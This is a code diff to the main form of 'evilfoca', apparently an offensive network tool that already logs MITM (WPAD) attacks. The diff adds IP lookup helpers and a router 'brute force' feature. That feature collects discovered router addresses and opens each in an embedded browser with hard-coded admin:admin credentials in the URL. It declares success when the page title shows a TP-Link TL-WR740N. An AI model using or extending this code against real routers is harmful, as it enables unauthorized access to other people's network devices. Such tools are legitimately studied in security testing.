@@ -26,6 +26,7 @@ using System.Collections.Generic;
 using System.ComponentModel;
 using System.Diagnostics;
 using System.Drawing;
+using System.IO;
 using System.Net;
 using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
@@ -259,6 +260,7 @@ namespace evilfoca
                     // Se agrega la IP en caso de que no exista
                     if (!tnRouter.Nodes.ContainsKey(ipAddress.ToString()))
                     {
+                        lbRoutersBruteForce.Items.Add(ipAddress.ToString());
                         treeView.Invoke(new MethodInvoker(delegate
                         {
                             TreeNode tnRouterIP = tnRouter.Nodes.Add(ipAddress.ToString(), ipAddress.ToString());
@@ -317,9 +319,23 @@ namespace evilfoca
             ));
         }
 
+        public static string GetLocalIPAddress()
+        {
+            var host = Dns.GetHostEntry(Dns.GetHostName());
+            foreach (var ip in host.AddressList)
+            {
+                if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
+                {
+                    return ip.ToString();
+                }
+            }
+            return "Not found";
+        }
+
         private void FormMain_Load(object sender, EventArgs e)
         {
             this.Text = Application.ProductName + " - " + Application.ProductVersion;
+            this.iPToolStripMenuItem.Text = GetLocalIPAddress();
             Program.CurrentProject.data.NewNeighbor += new EventHandler<NeighborEventArgs>(add_NewNeighbor);
             UpdateMainNodes();
 
@@ -1481,6 +1497,54 @@ namespace evilfoca
                 Program.LogThis("Performing a MITM (WPAD) attack " + attack.t2.ip.ToString(), Logs.Log.LogType.WpadIPv6);
             }
             wpadv6TargetPanel.ClearTargets();
+        }
+
+        private void btGetIP_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                lbIpAdressess.Items.Clear();
+                IPAddress[] ips = Dns.GetHostAddresses(tbIpGetIP.Text);
+
+                foreach (IPAddress ip in ips)
+                {
+                    lbIpAdressess.Items.Add(ip);
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("IP not found");
+            }
+        }
+
+        private void btCopyIp_Click(object sender, EventArgs e)
+        {
+            if (lbIpAdressess.SelectedIndex == -1)
+                return;
+
+            Clipboard.SetText(lbIpAdressess.SelectedItem.ToString());
+        }
+
+        private void btnAttack_Click(object sender, EventArgs e)
+        {
+            wbBrowser.Navigate("http://"+"admin"+":"+"admin"+"@"+lbRoutersBruteForce.SelectedItem.ToString());
+            tbRouterAttackLogs.Text += "Trying: " + "admin" + " : " + "admin" + Environment.NewLine;
+            tbRouterAttackLogs.SelectionStart = tbRouterAttackLogs.Text.Length;
+            tbRouterAttackLogs.ScrollToCaret();
+        }
+
+        private void wbBrowser_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
+        {
+            if (wbBrowser.DocumentTitle.ToString().Contains("TL-WR740N"))
+            {
+                wbBrowser.Stop();
+                MessageBox.Show("Done!" + Environment.NewLine + "Username: " + "admin" + Environment.NewLine +
+                                "Password: " + "admin");
+            }
+            else
+            {
+               wbBrowser.Navigate("www.google.com");
+            }
         }
     }
 }
